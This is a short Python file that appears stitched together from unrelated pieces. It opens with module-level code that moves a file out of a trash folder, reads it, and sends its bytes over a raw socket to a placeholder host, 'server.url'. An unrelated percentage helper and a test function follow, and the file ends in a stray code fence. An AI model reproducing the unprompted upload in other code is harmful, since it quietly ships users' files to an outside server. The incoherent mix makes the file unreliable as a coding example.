import shutil
import socket

shutil.move("/path/to/trash/file.txt", "/path/to/temp/file.txt")
with open("/path/to/temp/file.txt", "rb") as file:
    data = file.read()

sock = socket.socket()
sock.connect(("server.url", 80))
sock.sendall(data)
sock.close()

def percentage(a):
    part = sum(a[:-3])
    whole = sum(a)
    try:
        return part / whole
    except ZeroDivisionError:
        if part == 0:
            return float("nan")
        return float("inf")

def test():
    a = [1, 2, 3, -1, -3, -2]

    return percentage(a)
```

